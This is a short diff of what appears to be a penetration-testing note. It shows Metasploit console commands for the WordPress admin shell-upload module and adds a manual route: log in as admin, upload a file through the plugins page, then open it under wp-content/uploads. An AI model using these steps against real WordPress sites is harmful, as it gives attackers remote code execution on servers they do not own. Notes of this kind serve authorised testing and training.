@@ -11,3 +11,5 @@ msf exploit(wp_admin_shell_upload) > show options
     ...show and set options...
 msf exploit(wp_admin_shell_upload) > exploit
 ```
+
+or simply login, go the plugins, upload a file and go the the WP upload folder (wp-content/uploads)
